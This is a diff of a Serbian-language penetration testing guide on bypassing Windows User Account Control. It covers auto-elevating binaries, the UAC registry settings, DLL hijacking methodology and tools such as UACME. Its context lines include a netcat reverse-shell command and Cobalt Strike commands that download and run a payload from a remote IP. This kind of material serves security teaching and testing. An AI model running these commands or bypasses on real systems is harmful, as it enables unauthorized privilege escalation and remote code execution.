@@ -4,7 +4,7 @@
 
 ## UAC
 
-[Kontrola korisničkog naloga (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **izdavanje saglasnosti za uzdignute aktivnosti**. Aplikacije imaju različite `integrity` nivoe, a program sa **visokim nivoom** može izvoditi zadatke koji **mogu potencijalno ugroziti sistem**. Kada je UAC omogućen, aplikacije i zadaci uvek **rade pod sigurnosnim kontekstom naloga koji nije administrator** osim ako administrator izričito ne odobri tim aplikacijama/zadacima pristup na nivou administratora za izvršavanje. To je funkcija pogodnosti koja štiti administratore od nenamernih promena, ali se ne smatra sigurnosnom granicom.
+[Kontrola korisničkog naloga (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **izdavanje saglasnosti za uzdignute aktivnosti**. Aplikacije imaju različite nivoe `integriteta`, a program sa **visokim nivoom** može izvoditi zadatke koji **mogu potencijalno ugroziti sistem**. Kada je UAC omogućen, aplikacije i zadaci uvek **rade pod sigurnosnim kontekstom naloga koji nije administrator** osim ako administrator izričito ne odobri tim aplikacijama/zadacima pristup na nivou administratora za izvršavanje. To je funkcija pogodnosti koja štiti administratore od nenamernih promena, ali se ne smatra sigurnosnom granicom.
 
 Za više informacija o nivoima integriteta:
 
@@ -20,12 +20,12 @@ Ova [stranica](https://docs.microsoft.com/en-us/windows/security/identity-protec
 | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
 | [Kontrola korisničkog naloga: Mod odobrenja administratora za ugrađeni nalog administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Onemogućeno                                                 |
 | [Kontrola korisničkog naloga: Dozvoli UIAccess aplikacijama da traže uzdizanje bez korišćenja sigurnog radnog okruženja](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Onemogućeno                                                 |
-| [Kontrola korisničkog naloga: Ponašanje prompte za uzdizanje za administratore u modu odobrenja administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Traži saglasnost za ne-Windows binarne datoteke            |
+| [Kontrola korisničkog naloga: Ponašanje prompte za uzdizanje za administratore u režimu odobrenja administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Traži saglasnost za ne-Windows binarne datoteke            |
 | [Kontrola korisničkog naloga: Ponašanje prompte za uzdizanje za standardne korisnike](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Traži kredencijale na sigurnom radnom okruženju            |
 | [Kontrola korisničkog naloga: Otkrivanje instalacija aplikacija i traženje uzdizanja](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Omogućeno (podrazumevano za kućne verzije) Onemogućeno (podrazumevano za preduzeća) |
 | [Kontrola korisničkog naloga: Samo uzdigni izvršne datoteke koje su potpisane i validirane](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Onemogućeno                                                 |
 | [Kontrola korisničkog naloga: Samo uzdigni UIAccess aplikacije koje su instalirane na sigurnim lokacijama](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Omogućeno                                                  |
-| [Kontrola korisničkog naloga: Pokreni sve administratore u modu odobrenja administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Omogućeno                                                  |
+| [Kontrola korisničkog naloga: Pokreni sve administratore u režimu odobrenja administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Omogućeno                                                  |
 | [Kontrola korisničkog naloga: Prebaci se na sigurno radno okruženje kada se traži uzdizanje](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Omogućeno                                                  |
 | [Kontrola korisničkog naloga: Virtualizuj neuspehe pisanja u datoteke i registru na lokacije po korisniku](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Omogućeno                                                  |
 
@@ -33,13 +33,13 @@ Ova [stranica](https://docs.microsoft.com/en-us/windows/security/identity-protec
 
 Neki programi su **automatski uzdignuti** ako **korisnik pripada** **grupi administratora**. Ove binarne datoteke imaju unutar svojih _**Manifesta**_ opciju _**autoElevate**_ sa vrednošću _**True**_. Binarna datoteka takođe mora biti **potpisana od strane Microsoft-a**.
 
-Mnogi procesi koji se automatski uzdižu izlažu **funkcionalnost putem COM objekata ili RPC servera**, koji se mogu pozvati iz procesa koji rade sa srednjim integritetom (privilegije na nivou redovnog korisnika). Imajte na umu da su COM (Model objekata komponenti) i RPC (Daljinski poziv procedura) metode koje Windows programi koriste za komunikaciju i izvršavanje funkcija između različitih procesa. Na primer, **`IFileOperation COM objekat`** je dizajniran za upravljanje operacijama sa datotekama (kopiranje, brisanje, premestanje) i može automatski uzdignuti privilegije bez prompte.
+Mnogi procesi sa automatskim uzdizanjem izlažu **funkcionalnost putem COM objekata ili RPC servera**, koji se mogu pozvati iz procesa koji rade sa srednjim integritetom (privilegije na nivou redovnog korisnika). Imajte na umu da su COM (Model objekata komponenti) i RPC (Daljinski poziv procedura) metode koje Windows programi koriste za komunikaciju i izvršavanje funkcija između različitih procesa. Na primer, **`IFileOperation COM objekat`** je dizajniran za upravljanje operacijama sa datotekama (kopiranje, brisanje, premještanje) i može automatski uzdignuti privilegije bez prompte.
 
 Imajte na umu da se neki provere mogu izvršiti, kao što je provera da li je proces pokrenut iz **System32 direktorijuma**, što se može zaobići, na primer, **injektovanjem u explorer.exe** ili drugu izvršnu datoteku smeštenu u System32.
 
 Drugi način za zaobilaženje ovih provera je **modifikacija PEB-a**. Svaki proces u Windows-u ima Blok okruženja procesa (PEB), koji uključuje važne podatke o procesu, kao što je njegova putanja izvršne datoteke. Modifikovanjem PEB-a, napadači mogu lažirati (spoof) lokaciju svog malicioznog procesa, čineći da izgleda kao da se pokreće iz pouzdane direktorijuma (kao što je system32). Ove lažne informacije obmanjuju COM objekat da automatski uzdigne privilegije bez traženja od korisnika.
 
-Zatim, da bi se **zaobišao** **UAC** (uzdignuće sa **srednjeg** nivoa integriteta **na visoki**), neki napadači koriste ovu vrstu binarnih datoteka da **izvrše proizvoljan kod** jer će biti izvršen iz **procesa sa visokim nivoom integriteta**.
+Zatim, da bi se **zaobišao** **UAC** (uzdignuće sa **srednjeg** nivoa integriteta **na visoki**), neki napadači koriste ovu vrstu binarnih datoteka da **izvrše proizvoljan kod** jer će se izvršiti iz **procesa sa visokim nivoom integriteta**.
 
 Možete **proveriti** _**Manifest**_ binarne datoteke koristeći alat _**sigcheck.exe**_ iz Sysinternals. (`sigcheck.exe -m <file>`) I možete **videti** **nivo integriteta** procesa koristeći _Process Explorer_ ili _Process Monitor_ (iz Sysinternals).
 
@@ -61,7 +61,7 @@ REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 ConsentPromptBehaviorAdmin    REG_DWORD    0x5
 ```
-- Ako je **`0`**, UAC neće tražiti potvrdu (kao **onemogućeno**)
+- Ako je **`0`**, UAC neće tražiti (kao **onemogućeno**)
 - Ako je **`1`**, administratoru se **traži korisničko ime i lozinka** da izvrši binarni fajl sa visokim pravima (na Secure Desktop)
 - Ako je **`2`** (**Uvek me obavesti**) UAC će uvek tražiti potvrdu od administratora kada pokuša da izvrši nešto sa visokim privilegijama (na Secure Desktop)
 - Ako je **`3`**, kao `1` ali nije neophodno na Secure Desktop
@@ -72,13 +72,13 @@ Zatim, treba da pogledate vrednost **`LocalAccountTokenFilterPolicy`**\
 Ako je vrednost **`0`**, tada samo **RID 500** korisnik (**ugrađeni Administrator**) može da obavlja **administrativne zadatke bez UAC**, a ako je `1`, **svi nalozi unutar grupe "Administratori"** mogu to da rade.
 
 I, konačno, pogledajte vrednost ključa **`FilterAdministratorToken`**\
-Ako je **`0`**(podrazumevano), **ugrađeni Administrator nalog može** da obavlja zadatke daljinske administracije, a ako je **`1`**, ugrađeni Administrator **ne može** da obavlja zadatke daljinske administracije, osim ako je `LocalAccountTokenFilterPolicy` postavljen na `1`.
+Ako je **`0`** (podrazumevano), **ugrađeni Administrator nalog može** da obavlja udaljene administrativne zadatke, a ako je **`1`**, ugrađeni nalog Administrator **ne može** da obavlja udaljene administrativne zadatke, osim ako je `LocalAccountTokenFilterPolicy` postavljen na `1`.
 
 #### Sažetak
 
 - Ako je `EnableLUA=0` ili **ne postoji**, **nema UAC za nikoga**
-- Ako je `EnableLua=1` i **`LocalAccountTokenFilterPolicy=1`, Nema UAC za nikoga**
-- Ako je `EnableLua=1` i **`LocalAccountTokenFilterPolicy=0` i `FilterAdministratorToken=0`, Nema UAC za RID 500 (Ugrađeni Administrator)**
+- Ako je `EnableLua=1` i **`LocalAccountTokenFilterPolicy=1`, nema UAC za nikoga**
+- Ako je `EnableLua=1` i **`LocalAccountTokenFilterPolicy=0` i `FilterAdministratorToken=0`, nema UAC za RID 500 (ugrađeni Administrator)**
 - Ako je `EnableLua=1` i **`LocalAccountTokenFilterPolicy=0` i `FilterAdministratorToken=1`, UAC za sve**
 
 Sve ove informacije mogu se prikupiti koristeći **metasploit** modul: `post/windows/gather/win_privs`
@@ -112,7 +112,7 @@ Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10
 
 ### **Veoma** osnovno UAC "zaobilaženje" (potpun pristup datotečnom sistemu)
 
-Ako imate shell sa korisnikom koji je unutar Administrators grupe, možete **montirati C$** deljenje putem SMB (datotečni sistem) lokalno na novom disku i imaćete **pristup svemu unutar datotečnog sistema** (čak i Administratorskoj početnoj fascikli).
+Ako imate shell sa korisnikom koji je unutar Administrators grupe možete **montirati C$** deljenje putem SMB (datotečni sistem) lokalno na novom disku i imaćete **pristup svemu unutar datotečnog sistema** (čak i Administratorovoj početnoj fascikli).
 
 > [!WARNING]
 > **Izgleda da ova trik više ne funkcioniše**
@@ -137,18 +137,18 @@ runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-obj
 # Bypass UAC with CMSTPLUA COM interface
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 ```
-**Empire** i **Metasploit** takođe imaju nekoliko modula za **bypass** **UAC**.
+**Empire** i **Metasploit** takođe imaju nekoliko modula za **obići** **UAC**.
 
 ### KRBUACBypass
 
-Dokumentacija i alat na [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
+Dokumentacija i alat u [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
 
 ### UAC bypass eksploati
 
-[**UACME** ](https://github.com/hfiref0x/UACME) koja je **kompilacija** nekoliko UAC bypass eksploata. Imajte na umu da ćete morati da **kompajlirate UACME koristeći visual studio ili msbuild**. Kompilacija će kreirati nekoliko izvršnih fajlova (kao što je `Source\Akagi\outout\x64\Debug\Akagi.exe`), moraćete da znate **koji vam je potreban.**\
+[**UACME** ](https://github.com/hfiref0x/UACME)koji je **kompilacija** nekoliko UAC bypass eksploata. Imajte na umu da ćete morati da **kompajlirate UACME koristeći visual studio ili msbuild**. Kompilacija će kreirati nekoliko izvršnih fajlova (kao što je `Source\Akagi\outout\x64\Debug\Akagi.exe`), moraćete da znate **koji vam je potreban.**\
 Trebalo bi da **budete oprezni** jer neki bypass-ovi mogu **izazvati neka druga programa** koja će **obavestiti** **korisnika** da se nešto dešava.
 
-UACME ima **verziju iz koje je svaka tehnika počela da funkcioniše**. Možete pretraživati tehniku koja utiče na vaše verzije:
+UACME ima **verziju izgradnje od koje je svaka tehnika počela da funkcioniše**. Možete pretraživati tehniku koja utiče na vaše verzije:
 ```
 PS C:\> [environment]::OSVersion.Version
 
@@ -170,22 +170,22 @@ Možete dobiti koristeći **meterpreter** sesiju. Migrirajte na **proces** koji 
 
 ### UAC zaobilaženje sa GUI
 
-Ako imate pristup **GUI, možete jednostavno prihvatiti UAC prompt** kada ga dobijete, zaista vam ne treba zaobilaženje. Dakle, pristup GUI će vam omogućiti da zaobiđete UAC.
+Ako imate pristup **GUI-u, možete jednostavno prihvatiti UAC prompt** kada ga dobijete, zaista vam nije potrebna zaobilaznica. Dakle, dobijanje pristupa GUI-u će vam omogućiti da zaobiđete UAC.
 
-Štaviše, ako dobijete GUI sesiju koju je neko koristio (potencijalno putem RDP) postoje **neki alati koji će raditi kao administrator** odakle možete **pokrenuti** **cmd** na primer **kao admin** direktno bez ponovnog traženja od strane UAC kao [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Ovo može biti malo više **neprimetno**.
+Štaviše, ako dobijete GUI sesiju koju je neko koristio (potencijalno putem RDP-a), postoje **neki alati koji će raditi kao administrator** odakle možete **pokrenuti** **cmd** na primer **kao admin** direktno bez ponovnog traženja od strane UAC kao [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Ovo bi moglo biti malo više **neprimetno**.
 
-### Glasno brute-force UAC zaobilaženje
+### Bučan brute-force UAC zaobilaženje
 
 Ako vam nije stalo do buke, uvek možete **pokrenuti nešto poput** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) koje **traži da se podignu dozvole dok korisnik ne prihvati**.
 
-### Vaše vlastito zaobilaženje - Osnovna metodologija UAC zaobilaženja
+### Vaša vlastita zaobilaznica - Osnovna metodologija UAC zaobilaženja
 
 Ako pogledate **UACME**, primetićete da **većina UAC zaobilaženja zloupotrebljava Dll Hijacking ranjivost** (pretežno pisanje malicioznog dll-a na _C:\Windows\System32_). [Pročitajte ovo da biste saznali kako pronaći Dll Hijacking ranjivost](../windows-local-privilege-escalation/dll-hijacking/index.html).
 
 1. Pronađite binarni fajl koji će **autoelevate** (proverite da kada se izvrši, radi na visokom integritetu).
-2. Sa procmon pronađite događaje "**NAME NOT FOUND**" koji mogu biti ranjivi na **DLL Hijacking**.
+2. Sa procmon-om pronađite događaje "**NAME NOT FOUND**" koji mogu biti ranjivi na **DLL Hijacking**.
 3. Verovatno ćete morati da **napišete** DLL unutar nekih **zaštićenih putanja** (kao što je C:\Windows\System32) gde nemate dozvole za pisanje. Možete zaobići ovo koristeći:
-   1. **wusa.exe**: Windows 7,8 i 8.1. Omogućava ekstrakciju sadržaja CAB fajla unutar zaštićenih putanja (jer se ovaj alat izvršava iz visoke integritetske nivoa).
+   1. **wusa.exe**: Windows 7, 8 i 8.1. Omogućava ekstrakciju sadržaja CAB fajla unutar zaštićenih putanja (jer se ovaj alat izvršava iz visoke razine integriteta).
    2. **IFileOperation**: Windows 10.
 4. Pripremite **skriptu** da kopirate svoj DLL unutar zaštićene putanje i izvršite ranjivi i autoelevated binarni fajl.
 
